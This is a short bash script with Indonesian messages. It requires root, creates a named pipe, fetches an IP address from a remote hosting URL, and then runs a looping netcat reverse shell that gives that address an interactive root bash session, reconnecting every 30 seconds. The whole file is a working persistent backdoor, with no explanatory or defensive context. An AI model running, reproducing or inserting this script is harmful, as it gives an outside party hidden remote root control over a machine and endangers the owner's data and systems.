#!/bin/bash
if [[ "$(id -u)" != "0" ]];then
 echo "    GAGAL !!!,kamu harus dalam mode root"
 exit 0
fi

rm -rf /tmp/f

mkfifo /tmp/f

while true; do

IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
PORT="10041"

cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/f

sleep 30
done
